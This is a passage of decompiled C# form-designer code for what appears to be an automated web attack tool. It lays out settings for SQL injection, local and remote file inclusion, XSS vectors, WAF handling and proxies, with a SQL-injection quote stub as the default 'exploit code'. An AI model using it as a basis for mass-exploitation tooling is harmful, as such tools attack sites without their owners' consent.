		this.cmbFileInclusaoFilter.Size = new Size(110, 33);
		this.cmbFileInclusaoSearch.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbFileInclusaoSearch.Name = "cmbFileInclusaoSearch";
		this.cmbFileInclusaoSearch.Size = new Size(160, 33);
		this.btnFileInclusaoSearchClear.DisplayStyle = ToolStripItemDisplayStyle.Image;
		this.btnFileInclusaoSearchClear.Image = Class6.delete;
		this.btnFileInclusaoSearchClear.ImageTransparentColor = Color.Magenta;
		this.btnFileInclusaoSearchClear.Name = "btnFileInclusaoSearchClear";
		this.btnFileInclusaoSearchClear.Size = new Size(28, 30);
		this.btnFileInclusaoSearchClear.Text = "Clear";
		this.txtFileInclusaoSearch.Name = "txtFileInclusaoSearch";
		this.txtFileInclusaoSearch.Size = new Size(148, 33);
		this.btnFileInclusaoSearch.Image = Class6.SearchContract_16x_24;
		this.btnFileInclusaoSearch.ImageTransparentColor = Color.Magenta;
		this.btnFileInclusaoSearch.Name = "btnFileInclusaoSearch";
		this.btnFileInclusaoSearch.Size = new Size(92, 30);
		this.btnFileInclusaoSearch.Text = "Search";
		this.lblSQLiNoInjectCount.Alignment = ToolStripItemAlignment.Right;
		this.lblSQLiNoInjectCount.Name = "lblSQLiNoInjectCount";
		this.lblSQLiNoInjectCount.Size = new Size(6, 33);
		this.lblFileInclusao.Alignment = ToolStripItemAlignment.Right;
		this.lblFileInclusao.Name = "lblFileInclusao";
		this.lblFileInclusao.Size = new Size(122, 25);
		this.lblFileInclusao.Text = "lblFileInclusao";
		this.pnlTrash.AutoScroll = true;
		this.pnlTrash.Controls.Add(this.dtgTrash);
		this.pnlTrash.Location = new Point(2405, 383);
		this.pnlTrash.Margin = new Padding(4, 5, 4, 5);
		this.pnlTrash.Name = "pnlTrash";
		this.pnlTrash.Size = new Size(136, 125);
		this.pnlTrash.TabIndex = 32;
		this.pnlTrash.Visible = false;
		this.dtgTrash.AllowDrop = true;
		this.dtgTrash.AllowUserToAddRows = false;
		this.dtgTrash.AllowUserToDeleteRows = false;
		this.dtgTrash.AllowUserToResizeColumns = false;
		this.dtgTrash.AllowUserToResizeRows = false;
		this.dtgTrash.BackgroundColor = SystemColors.Window;
		this.dtgTrash.BorderStyle = BorderStyle.Fixed3D;
		this.dtgTrash.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgTrash.ColumnHeadersVisible = false;
		this.dtgTrash.Columns.AddRange(new DataGridViewColumn[]
		{
			this.DataGridViewTextBoxColumn1
		});
		this.dtgTrash.ContextMenuStrip = this.mnuTrash;
		this.dtgTrash.Dock = DockStyle.Fill;
		this.dtgTrash.Location = new Point(0, 0);
		this.dtgTrash.Name = "dtgTrash";
		this.dtgTrash.RowHeadersVisible = false;
		this.dtgTrash.RowHeadersWidth = 60;
		this.dtgTrash.ScrollBars = ScrollBars.Vertical;
		this.dtgTrash.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		this.dtgTrash.ShowCellErrors = false;
		this.dtgTrash.ShowCellToolTips = false;
		this.dtgTrash.ShowEditingIcon = false;
		this.dtgTrash.ShowRowErrors = false;
		this.dtgTrash.Size = new Size(136, 125);
		this.dtgTrash.TabIndex = 38;
		this.DataGridViewTextBoxColumn1.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		this.DataGridViewTextBoxColumn1.HeaderText = "URL";
		this.DataGridViewTextBoxColumn1.Name = "DataGridViewTextBoxColumn1";
		this.DataGridViewTextBoxColumn1.Resizable = DataGridViewTriState.False;
		this.DataGridViewTextBoxColumn1.SortMode = DataGridViewColumnSortMode.NotSortable;
		this.mnuTrash.ImageScalingSize = new Size(24, 24);
		this.mnuTrash.Items.AddRange(new ToolStripItem[]
		{
			this.mnuTrashRefresh,
			this.ToolStripSeparator1,
			this.mnuTrashClippboard,
			this.mnuTrashSelectAll,
			this.ToolStripSeparator8,
			this.mnuTrashClearAll,
			this.ToolStripSeparator10,
			this.mnuTrashRemove,
			this.ToolStripSeparator11,
			this.mnuTrashCount
		});
		this.mnuTrash.Name = "mnuChecked";
		this.mnuTrash.ShowImageMargin = false;
		this.mnuTrash.ShowItemToolTips = false;
		this.mnuTrash.Size = new Size(159, 208);
		this.mnuTrashRefresh.Name = "mnuTrashRefresh";
		this.mnuTrashRefresh.Size = new Size(158, 30);
		this.mnuTrashRefresh.Text = "Load Last 2k";
		this.ToolStripSeparator1.Name = "ToolStripSeparator1";
		this.ToolStripSeparator1.Size = new Size(155, 6);
		this.mnuTrashClippboard.Name = "mnuTrashClippboard";
		this.mnuTrashClippboard.Size = new Size(158, 30);
		this.mnuTrashClippboard.Text = "Clipboard";
		this.mnuTrashSelectAll.Name = "mnuTrashSelectAll";
		this.mnuTrashSelectAll.Size = new Size(158, 30);
		this.mnuTrashSelectAll.Text = "Select All";
		this.ToolStripSeparator8.Name = "ToolStripSeparator8";
		this.ToolStripSeparator8.Size = new Size(155, 6);
		this.mnuTrashClearAll.Name = "mnuTrashClearAll";
		this.mnuTrashClearAll.Size = new Size(158, 30);
		this.mnuTrashClearAll.Text = "Clear All";
		this.ToolStripSeparator10.Name = "ToolStripSeparator10";
		this.ToolStripSeparator10.Size = new Size(155, 6);
		this.mnuTrashRemove.Name = "mnuTrashRemove";
		this.mnuTrashRemove.Size = new Size(158, 30);
		this.mnuTrashRemove.Text = "Remove";
		this.ToolStripSeparator11.Name = "ToolStripSeparator11";
		this.ToolStripSeparator11.Size = new Size(155, 6);
		this.mnuTrashCount.Enabled = false;
		this.mnuTrashCount.Name = "mnuTrashCount";
		this.mnuTrashCount.Size = new Size(158, 30);
		this.mnuTrashCount.Text = "Total: URLs";
		this.pnlWindows.Location = new Point(2220, 383);
		this.pnlWindows.Name = "pnlWindows";
		this.pnlWindows.Size = new Size(84, 128);
		this.pnlWindows.TabIndex = 133;
		this.pnlControls.AutoScroll = true;
		this.pnlControls.AutoSize = true;
		this.pnlControls.Location = new Point(2144, 383);
		this.pnlControls.Name = "pnlControls";
		this.pnlControls.Size = new Size(70, 128);
		this.pnlControls.TabIndex = 112;
		this.grbHttpLog.Controls.Add(this.lvwHttpLog);
		this.grbHttpLog.Dock = DockStyle.Bottom;
		this.grbHttpLog.Location = new Point(0, 1011);
		this.grbHttpLog.Name = "grbHttpLog";
		this.grbHttpLog.Size = new Size(2583, 78);
		this.grbHttpLog.TabIndex = 34;
		this.grbHttpLog.Text = "HTTP Debugger";
		this.lvwHttpLog.AllowUserToAddRows = false;
		this.lvwHttpLog.AllowUserToResizeColumns = false;
		this.lvwHttpLog.AllowUserToResizeRows = false;
		this.lvwHttpLog.BackgroundColor = SystemColors.Window;
		this.lvwHttpLog.BorderStyle = BorderStyle.Fixed3D;
		this.lvwHttpLog.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.lvwHttpLog.Columns.AddRange(new DataGridViewColumn[]
		{
			this.DataGridViewTextBoxColumn_0,
			this.clURL,
			this.Column2,
			this.Column4,
			this.Column3,
			this.ProxyIP
		});
		this.lvwHttpLog.ContextMenuStrip = this.mnuHttpLog;
		this.lvwHttpLog.Dock = DockStyle.Fill;
		this.lvwHttpLog.Location = new Point(0, 0);
		this.lvwHttpLog.MultiSelect = false;
		this.lvwHttpLog.Name = "lvwHttpLog";
		this.lvwHttpLog.RowHeadersVisible = false;
		this.lvwHttpLog.ShowCellErrors = false;
		this.lvwHttpLog.ShowEditingIcon = false;
		this.lvwHttpLog.ShowRowErrors = false;
		this.lvwHttpLog.Size = new Size(2583, 78);
		this.lvwHttpLog.TabIndex = 4;
		this.DataGridViewTextBoxColumn_0.HeaderText = "ID";
		this.DataGridViewTextBoxColumn_0.Name = "ID";
		this.DataGridViewTextBoxColumn_0.Visible = false;
		this.clURL.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		this.clURL.HeaderText = "URL";
		this.clURL.Name = "clURL";
		this.clURL.Resizable = DataGridViewTriState.True;
		this.Column2.AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column2.HeaderText = "Size";
		this.Column2.Name = "Column2";
		this.Column2.ReadOnly = true;
		this.Column2.Width = 76;
		this.Column4.AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column4.HeaderText = "Status";
		this.Column4.Name = "Column4";
		this.Column4.ReadOnly = true;
		this.Column4.Resizable = DataGridViewTriState.True;
		this.Column4.Width = 92;
		this.Column3.AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column3.HeaderText = "Elapsed";
		this.Column3.Name = "Column3";
		this.Column3.ReadOnly = true;
		this.Column3.Width = 103;
		this.ProxyIP.AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.ProxyIP.HeaderText = "Proxy";
		this.ProxyIP.Name = "ProxyIP";
		this.ProxyIP.ReadOnly = true;
		this.ProxyIP.Width = 83;
		this.mnuHttpLog.ImageScalingSize = new Size(24, 24);
		this.mnuHttpLog.Items.AddRange(new ToolStripItem[]
		{
			this.mnuHttpLogClear,
			this.mnuHttpLogShell,
			this.mnuHttpLogClipboard,
			this.ToolStripSeparator4,
			this.mnuHttpLogAutoScroll,
			this.mnuHttpLogDock
		});
		this.mnuHttpLog.Name = "mnuChecked";
		this.mnuHttpLog.ShowImageMargin = false;
		this.mnuHttpLog.ShowItemToolTips = false;
		this.mnuHttpLog.Size = new Size(147, 160);
		this.mnuHttpLogClear.Name = "mnuHttpLogClear";
		this.mnuHttpLogClear.Size = new Size(146, 30);
		this.mnuHttpLogClear.Text = "Clear";
		this.mnuHttpLogShell.Name = "mnuHttpLogShell";
		this.mnuHttpLogShell.Size = new Size(146, 30);
		this.mnuHttpLogShell.Text = "Shell";
		this.mnuHttpLogClipboard.Name = "mnuHttpLogClipboard";
		this.mnuHttpLogClipboard.Size = new Size(146, 30);
		this.mnuHttpLogClipboard.Text = "Clipboard";
		this.ToolStripSeparator4.Name = "ToolStripSeparator4";
		this.ToolStripSeparator4.Size = new Size(143, 6);
		this.mnuHttpLogAutoScroll.CheckOnClick = true;
		this.mnuHttpLogAutoScroll.Name = "mnuHttpLogAutoScroll";
		this.mnuHttpLogAutoScroll.Size = new Size(146, 30);
		this.mnuHttpLogAutoScroll.Text = "Auto Scroll";
		this.mnuHttpLogDock.Name = "mnuHttpLogDock";
		this.mnuHttpLogDock.Size = new Size(146, 30);
		this.mnuHttpLogDock.Text = "UnDock";
		this.VisualStyler1.HookVisualStyles = true;
		this.VisualStyler1.HostForm = this;
		this.VisualStyler1.License = (VisualStylerLicense)componentResourceManager.GetObject("VisualStyler1.License");
		this.VisualStyler1.UseSystemFonts = true;
		this.VisualStyler1.LoadVisualStyle("");
		this.pnlSettingsAdvanced.AutoScroll = true;
		this.pnlSettingsAdvanced.Controls.Add(this.grbXSS);
		this.pnlSettingsAdvanced.Controls.Add(this.grbLfiLinux);
		this.pnlSettingsAdvanced.Controls.Add(this.grbSQLi);
		this.pnlSettingsAdvanced.Controls.Add(this.grbHTTPExploit);
		this.pnlSettingsAdvanced.Controls.Add(this.grbFileIncWAFs);
		this.pnlSettingsAdvanced.Controls.Add(this.lblAdvanced);
		this.pnlSettingsAdvanced.Controls.Add(this.grbRFI);
		this.pnlSettingsAdvanced.Controls.Add(this.grbScanner);
		this.pnlSettingsAdvanced.Location = new Point(897, 15);
		this.pnlSettingsAdvanced.Margin = new Padding(4, 5, 4, 5);
		this.pnlSettingsAdvanced.Name = "pnlSettingsAdvanced";
		this.pnlSettingsAdvanced.Size = new Size(620, 1250);
		this.pnlSettingsAdvanced.TabIndex = 35;
		this.pnlSettingsAdvanced.Visible = false;
		this.grbXSS.Controls.Add(this.lvwXSS);
		this.grbXSS.Location = new Point(3, 795);
		this.grbXSS.Name = "grbXSS";
		this.grbXSS.Size = new Size(579, 185);
		this.grbXSS.TabIndex = 8;
		this.grbXSS.TabStop = false;
		this.grbXSS.Text = "XSS (Cross Site Scripting)";
		this.lvwXSS.Columns.AddRange(new ColumnHeader[]
		{
			this.ColumnHeader36,
			this.ColumnHeader37
		});
		this.lvwXSS.ContextMenuStrip = this.mnuPaths;
		this.lvwXSS.FullRowSelect = true;
		this.lvwXSS.GridLines = true;
		this.lvwXSS.HideSelection = false;
		this.lvwXSS.Location = new Point(10, 22);
		this.lvwXSS.MultiSelect = false;
		this.lvwXSS.Name = "lvwXSS";
		this.lvwXSS.Size = new Size(550, 156);
		this.lvwXSS.TabIndex = 1;
		this.lvwXSS.UseCompatibleStateImageBehavior = false;
		this.lvwXSS.View = View.Details;
		this.ColumnHeader36.Text = "Vector";
		this.ColumnHeader36.Width = 189;
		this.ColumnHeader37.Text = "Keyword";
		this.ColumnHeader37.Width = 140;
		this.mnuPaths.ImageScalingSize = new Size(24, 24);
		this.mnuPaths.Items.AddRange(new ToolStripItem[]
		{
			this.mnuPathAdd,
			this.mnuPathEdit,
			this.mnuPathRem
		});
		this.mnuPaths.Name = "mnuChecked";
		this.mnuPaths.ShowImageMargin = false;
		this.mnuPaths.ShowItemToolTips = false;
		this.mnuPaths.Size = new Size(124, 94);
		this.mnuPathAdd.Name = "mnuPathAdd";
		this.mnuPathAdd.Size = new Size(123, 30);
		this.mnuPathAdd.Text = "Add";
		this.mnuPathEdit.Name = "mnuPathEdit";
		this.mnuPathEdit.Size = new Size(123, 30);
		this.mnuPathEdit.Text = "Edit";
		this.mnuPathRem.Name = "mnuPathRem";
		this.mnuPathRem.Size = new Size(123, 30);
		this.mnuPathRem.Text = "Remove";
		this.grbLfiLinux.Controls.Add(this.tabFileInc);
		this.grbLfiLinux.Location = new Point(3, 540);
		this.grbLfiLinux.Name = "grbLfiLinux";
		this.grbLfiLinux.Size = new Size(579, 255);
		this.grbLfiLinux.TabIndex = 0;
		this.grbLfiLinux.TabStop = false;
		this.grbLfiLinux.Text = "LFI (Local File Inclusion)";
		this.tabFileInc.Alignment = TabAlignment.Top;
		this.tabFileInc.Controls.Add(this.TabPage6);
		this.tabFileInc.Controls.Add(this.tpLfiWin);
		this.tabFileInc.Dock = DockStyle.Fill;
		this.tabFileInc.Location = new Point(3, 22);
		this.tabFileInc.Margin = new Padding(4, 5, 4, 5);
		this.tabFileInc.Name = "tabFileInc";
		this.tabFileInc.SelectedIndex = 0;
		this.tabFileInc.Size = new Size(573, 230);
		this.tabFileInc.TabIndex = 0;
		this.TabPage6.Controls.Add(this.numLFIpathTraversalCount);
		this.TabPage6.Controls.Add(this.lblLFIPathCount);
		this.TabPage6.Controls.Add(this.lvwLFIpathLinux);
		this.TabPage6.Location = new Point(4, 29);
		this.TabPage6.Margin = new Padding(4, 5, 4, 5);
		this.TabPage6.Name = "TabPage6";
		this.TabPage6.Padding = new Padding(4, 5, 4, 5);
		this.TabPage6.Size = new Size(565, 197);
		this.TabPage6.TabIndex = 0;
		this.TabPage6.Text = "Linux";
		this.TabPage6.UseVisualStyleBackColor = true;
		this.numLFIpathTraversalCount.Location = new Point(6, 9);
		this.numLFIpathTraversalCount.Margin = new Padding(4, 5, 4, 5);
		NumericUpDown numLFIpathTraversalCount = this.numLFIpathTraversalCount;
		int[] array16 = new int[4];
		array16[0] = 20;
		numLFIpathTraversalCount.Maximum = new decimal(array16);
		NumericUpDown numLFIpathTraversalCount2 = this.numLFIpathTraversalCount;
		int[] array17 = new int[4];
		array17[0] = 1;
		numLFIpathTraversalCount2.Minimum = new decimal(array17);
		this.numLFIpathTraversalCount.Name = "numLFIpathTraversalCount";
		this.numLFIpathTraversalCount.Size = new Size(58, 26);
		this.numLFIpathTraversalCount.TabIndex = 0;
		NumericUpDown numLFIpathTraversalCount3 = this.numLFIpathTraversalCount;
		int[] array18 = new int[4];
		array18[0] = 10;
		numLFIpathTraversalCount3.Value = new decimal(array18);
		this.lvwLFIpathLinux.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
		this.lvwLFIpathLinux.Columns.AddRange(new ColumnHeader[]
		{
			this.ColumnHeader5,
			this.ColumnHeader7
		});
		this.lvwLFIpathLinux.ContextMenuStrip = this.mnuPaths;
		this.lvwLFIpathLinux.FullRowSelect = true;
		this.lvwLFIpathLinux.GridLines = true;
		this.lvwLFIpathLinux.HideSelection = false;
		this.lvwLFIpathLinux.Location = new Point(4, 48);
		this.lvwLFIpathLinux.MultiSelect = false;
		this.lvwLFIpathLinux.Name = "lvwLFIpathLinux";
		this.lvwLFIpathLinux.Size = new Size(550, 146);
		this.lvwLFIpathLinux.TabIndex = 2;
		this.lvwLFIpathLinux.UseCompatibleStateImageBehavior = false;
		this.lvwLFIpathLinux.View = View.Details;
		this.ColumnHeader5.Text = "Path";
		this.ColumnHeader5.Width = 190;
		this.ColumnHeader7.Text = "Keyword";
		this.ColumnHeader7.Width = 140;
		this.tpLfiWin.Controls.Add(this.lvwLFIpathWin);
		this.tpLfiWin.Location = new Point(4, 29);
		this.tpLfiWin.Margin = new Padding(4, 5, 4, 5);
		this.tpLfiWin.Name = "tpLfiWin";
		this.tpLfiWin.Padding = new Padding(4, 5, 4, 5);
		this.tpLfiWin.Size = new Size(565, 197);
		this.tpLfiWin.TabIndex = 1;
		this.tpLfiWin.Text = "Windows";
		this.tpLfiWin.UseVisualStyleBackColor = true;
		this.lvwLFIpathWin.Columns.AddRange(new ColumnHeader[]
		{
			this.ColumnHeader8,
			this.ColumnHeader9
		});
		this.lvwLFIpathWin.ContextMenuStrip = this.mnuPaths;
		this.lvwLFIpathWin.Dock = DockStyle.Fill;
		this.lvwLFIpathWin.FullRowSelect = true;
		this.lvwLFIpathWin.GridLines = true;
		this.lvwLFIpathWin.HideSelection = false;
		this.lvwLFIpathWin.Location = new Point(4, 5);
		this.lvwLFIpathWin.MultiSelect = false;
		this.lvwLFIpathWin.Name = "lvwLFIpathWin";
		this.lvwLFIpathWin.Size = new Size(557, 187);
		this.lvwLFIpathWin.TabIndex = 0;
		this.lvwLFIpathWin.UseCompatibleStateImageBehavior = false;
		this.lvwLFIpathWin.View = View.Details;
		this.ColumnHeader8.Text = "Path";
		this.ColumnHeader8.Width = 190;
		this.ColumnHeader9.Text = "Keyword";
		this.ColumnHeader9.Width = 140;
		this.grbSQLi.Controls.Add(this.tabSQLi);
		this.grbSQLi.Location = new Point(3, 231);
		this.grbSQLi.Name = "grbSQLi";
		this.grbSQLi.Size = new Size(579, 309);
		this.grbSQLi.TabIndex = 6;
		this.grbSQLi.TabStop = false;
		this.grbSQLi.Text = "SQLi (SQL Injection)";
		this.tabSQLi.Alignment = TabAlignment.Top;
		this.tabSQLi.Controls.Add(this.TabPage1);
		this.tabSQLi.Controls.Add(this.TabPage2);
		this.tabSQLi.Controls.Add(this.TabPage3);
		this.tabSQLi.Dock = DockStyle.Fill;
		this.tabSQLi.Location = new Point(3, 22);
		this.tabSQLi.Name = "tabSQLi";
		this.tabSQLi.SelectedIndex = 0;
		this.tabSQLi.Size = new Size(573, 284);
		this.tabSQLi.TabIndex = 125;
		this.TabPage1.Controls.Add(this.chkAnalizeMsAcessSybase);
		this.TabPage1.Controls.Add(this.chkAnalizerPostgreErrorUnion);
		this.TabPage1.Controls.Add(this.chkAnalizerOracleErrorUnion);
		this.TabPage1.Controls.Add(this.txtAnalizerExploitCode);
		this.TabPage1.Controls.Add(this.chkAnalizerMySQLErrorUnion);
		this.TabPage1.Controls.Add(this.numAnalizerUnionEnd);
		this.TabPage1.Controls.Add(this.chkAnalizerMSSQLErrorUnion);
		this.TabPage1.Controls.Add(this.chkAnalizeWAF);
		this.TabPage1.Controls.Add(this.numAnalizerUnionSart);
		this.TabPage1.Controls.Add(this.lblSQLiExploitCode);
		this.TabPage1.Controls.Add(this.lblSQLiUnionCount);
		this.TabPage1.Controls.Add(this.lblSQLiUnionTo);
		this.TabPage1.Controls.Add(this.chkAnalizeMySQLReadWrite);
		this.TabPage1.Location = new Point(4, 29);
		this.TabPage1.Name = "TabPage1";
		this.TabPage1.Padding = new Padding(3);
		this.TabPage1.Size = new Size(565, 251);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = "General";
		this.TabPage1.UseVisualStyleBackColor = true;
		this.chkAnalizeMsAcessSybase.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.chkAnalizeMsAcessSybase.Checked = true;
		this.chkAnalizeMsAcessSybase.CheckState = CheckState.Checked;
		this.chkAnalizeMsAcessSybase.ForeColor = SystemColors.ControlText;
		this.chkAnalizeMsAcessSybase.Location = new Point(12, 155);
		this.chkAnalizeMsAcessSybase.Name = "chkAnalizeMsAcessSybase";
		this.chkAnalizeMsAcessSybase.Size = new Size(436, 25);
		this.chkAnalizeMsAcessSybase.TabIndex = 130;
		this.chkAnalizeMsAcessSybase.Text = "Add MsAccess and Sybase to Non-Injecables";
		this.chkAnalizeMsAcessSybase.UseVisualStyleBackColor = true;
		this.chkAnalizerPostgreErrorUnion.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.chkAnalizerPostgreErrorUnion.ForeColor = SystemColors.ControlText;
		this.chkAnalizerPostgreErrorUnion.Location = new Point(12, 82);
		this.chkAnalizerPostgreErrorUnion.Name = "chkAnalizerPostgreErrorUnion";
		this.chkAnalizerPostgreErrorUnion.Size = new Size(436, 25);
		this.chkAnalizerPostgreErrorUnion.TabIndex = 129;
		this.chkAnalizerPostgreErrorUnion.Text = "Check Union in PostgreSQL Error";
		this.chkAnalizerPostgreErrorUnion.UseVisualStyleBackColor = true;
		this.chkAnalizerOracleErrorUnion.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.chkAnalizerOracleErrorUnion.ForeColor = SystemColors.ControlText;
		this.chkAnalizerOracleErrorUnion.Location = new Point(12, 55);
		this.chkAnalizerOracleErrorUnion.Name = "chkAnalizerOracleErrorUnion";
		this.chkAnalizerOracleErrorUnion.Size = new Size(436, 25);
		this.chkAnalizerOracleErrorUnion.TabIndex = 128;
		this.chkAnalizerOracleErrorUnion.Text = "Check Union in Oracle Error";
		this.chkAnalizerOracleErrorUnion.UseVisualStyleBackColor = true;
		this.txtAnalizerExploitCode.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
		this.txtAnalizerExploitCode.Location = new Point(182, 220);
		this.txtAnalizerExploitCode.Name = "txtAnalizerExploitCode";
		this.txtAnalizerExploitCode.Size = new Size(145, 26);
		this.txtAnalizerExploitCode.TabIndex = 125;
		this.txtAnalizerExploitCode.Text = "'[0]";
		this.chkAnalizerMySQLErrorUnion.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.chkAnalizerMySQLErrorUnion.Checked = true;
		this.chkAnalizerMySQLErrorUnion.CheckState = CheckState.Checked;
		this.chkAnalizerMySQLErrorUnion.ForeColor = SystemColors.ControlText;
		this.chkAnalizerMySQLErrorUnion.Location = new Point(12, 6);
		this.chkAnalizerMySQLErrorUnion.Name = "chkAnalizerMySQLErrorUnion";
		this.chkAnalizerMySQLErrorUnion.Size = new Size(436, 25);
		this.chkAnalizerMySQLErrorUnion.TabIndex = 41;
		this.chkAnalizerMySQLErrorUnion.Text = "Check Union in MySQL Error";
		this.chkAnalizerMySQLErrorUnion.UseVisualStyleBackColor = true;
		this.numAnalizerUnionEnd.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
		this.numAnalizerUnionEnd.Location = new Point(100, 220);
		NumericUpDown numAnalizerUnionEnd = this.numAnalizerUnionEnd;
		int[] array19 = new int[4];
		array19[0] = 2;
		numAnalizerUnionEnd.Minimum = new decimal(array19);
		this.numAnalizerUnionEnd.Name = "numAnalizerUnionEnd";
		this.numAnalizerUnionEnd.Size = new Size(58, 26);
		this.numAnalizerUnionEnd.TabIndex = 13;
		this.numAnalizerUnionEnd.TextAlign = HorizontalAlignment.Right;
		NumericUpDown numAnalizerUnionEnd2 = this.numAnalizerUnionEnd;
		int[] array20 = new int[4];
		array20[0] = 35;
		numAnalizerUnionEnd2.Value = new decimal(array20);
		this.chkAnalizerMSSQLErrorUnion.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.chkAnalizerMSSQLErrorUnion.ForeColor = SystemColors.ControlText;
		this.chkAnalizerMSSQLErrorUnion.Location = new Point(12, 31);
		this.chkAnalizerMSSQLErrorUnion.Name = "chkAnalizerMSSQLErrorUnion";
		this.chkAnalizerMSSQLErrorUnion.Size = new Size(436, 25);
		this.chkAnalizerMSSQLErrorUnion.TabIndex = 42;
		this.chkAnalizerMSSQLErrorUnion.Text = "Check Union in MS SQL Error";
		this.chkAnalizerMSSQLErrorUnion.UseVisualStyleBackColor = true;
		this.chkAnalizeWAF.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.chkAnalizeWAF.Checked = true;
		this.chkAnalizeWAF.CheckState = CheckState.Checked;
		this.chkAnalizeWAF.ForeColor = SystemColors.ControlText;
		this.chkAnalizeWAF.Location = new Point(12, 131);
		this.chkAnalizeWAF.Name = "chkAnalizeWAF";
		this.chkAnalizeWAF.Size = new Size(436, 25);
		this.chkAnalizeWAF.TabIndex = 43;
		this.chkAnalizeWAF.Text = "Enable WAFs";
		this.chkAnalizeWAF.UseVisualStyleBackColor = true;
		this.numAnalizerUnionSart.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
		this.numAnalizerUnionSart.Location = new Point(6, 220);
		NumericUpDown numAnalizerUnionSart = this.numAnalizerUnionSart;
		int[] array21 = new int[4];
		array21[0] = 20;
		numAnalizerUnionSart.Maximum = new decimal(array21);
		NumericUpDown numAnalizerUnionSart2 = this.numAnalizerUnionSart;
		int[] array22 = new int[4];
		array22[0] = 1;
		numAnalizerUnionSart2.Minimum = new decimal(array22);
		this.numAnalizerUnionSart.Name = "numAnalizerUnionSart";
		this.numAnalizerUnionSart.Size = new Size(58, 26);
		this.numAnalizerUnionSart.TabIndex = 12;
		this.numAnalizerUnionSart.TextAlign = HorizontalAlignment.Right;
		NumericUpDown numAnalizerUnionSart3 = this.numAnalizerUnionSart;
		int[] array23 = new int[4];
		array23[0] = 1;
		numAnalizerUnionSart3.Value = new decimal(array23);
		this.lblSQLiExploitCode.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
		this.lblSQLiExploitCode.Location = new Point(178, 189);
		this.lblSQLiExploitCode.Margin = new Padding(4, 0, 4, 0);
		this.lblSQLiExploitCode.Name = "lblSQLiExploitCode";
		this.lblSQLiExploitCode.Size = new Size(148, 26);
		this.lblSQLiExploitCode.TabIndex = 126;
		this.lblSQLiExploitCode.Text = "Exploit Code";
		this.lblSQLiExploitCode.TextAlign = ContentAlignment.MiddleLeft;
		this.lblSQLiUnionCount.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
		this.lblSQLiUnionCount.ForeColor = SystemColors.ControlText;
		this.lblSQLiUnionCount.Location = new Point(6, 194);
		this.lblSQLiUnionCount.Name = "lblSQLiUnionCount";
		this.lblSQLiUnionCount.Size = new Size(208, 18);
		this.lblSQLiUnionCount.TabIndex = 124;
		this.lblSQLiUnionCount.Text = "&Union Column Count";
		this.lblSQLiUnionCount.TextAlign = ContentAlignment.MiddleLeft;
		this.lblSQLiUnionTo.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
		this.lblSQLiUnionTo.AutoSize = true;
		this.lblSQLiUnionTo.ForeColor = SystemColors.ControlText;
		this.lblSQLiUnionTo.Location = new Point(70, 220);
		this.lblSQLiUnionTo.Name = "lblSQLiUnionTo";
		this.lblSQLiUnionTo.Size = new Size(27, 20);
		this.lblSQLiUnionTo.TabIndex = 15;
		this.lblSQLiUnionTo.Text = "&To";
		this.lblSQLiUnionTo.TextAlign = ContentAlignment.MiddleRight;
		this.chkAnalizeMySQLReadWrite.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.chkAnalizeMySQLReadWrite.Checked = true;
		this.chkAnalizeMySQLReadWrite.CheckState = CheckState.Checked;
		this.chkAnalizeMySQLReadWrite.ForeColor = SystemColors.ControlText;
		this.chkAnalizeMySQLReadWrite.Location = new Point(12, 106);
		this.chkAnalizeMySQLReadWrite.Name = "chkAnalizeMySQLReadWrite";
		this.chkAnalizeMySQLReadWrite.Size = new Size(436, 25);
		this.chkAnalizeMySQLReadWrite.TabIndex = 131;
		this.chkAnalizeMySQLReadWrite.Text = "Check MySQL Read\\Write File";
		this.chkAnalizeMySQLReadWrite.UseVisualStyleBackColor = true;
		this.TabPage2.Controls.Add(this.lstAnalizerUnion);
		this.TabPage2.Location = new Point(4, 29);
		this.TabPage2.Name = "TabPage2";
		this.TabPage2.Padding = new Padding(3);
		this.TabPage2.Size = new Size(565, 251);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = "Unions Vectors ";
		this.TabPage2.UseVisualStyleBackColor = true;
		this.lstAnalizerUnion.ContextMenuStrip = this.mnuPaths;
		this.lstAnalizerUnion.Dock = DockStyle.Fill;
		this.lstAnalizerUnion.FormattingEnabled = true;
		this.lstAnalizerUnion.IntegralHeight = false;
		this.lstAnalizerUnion.Location = new Point(3, 3);
		this.lstAnalizerUnion.Name = "lstAnalizerUnion";
		this.lstAnalizerUnion.Size = new Size(559, 245);
		this.lstAnalizerUnion.TabIndex = 1;
		this.lstAnalizerUnion.ThreeDCheckBoxes = true;
		this.lstAnalizerUnion.UseTabStops = false;
		this.TabPage3.Controls.Add(this.lstAnalizerError);
		this.TabPage3.Location = new Point(4, 29);
		this.TabPage3.Name = "TabPage3";
		this.TabPage3.Padding = new Padding(3);
		this.TabPage3.Size = new Size(565, 251);
		this.TabPage3.TabIndex = 2;
		this.TabPage3.Text = "Error Vectors ";
		this.TabPage3.UseVisualStyleBackColor = true;
		this.lstAnalizerError.ContextMenuStrip = this.mnuPaths;
		this.lstAnalizerError.Dock = DockStyle.Fill;
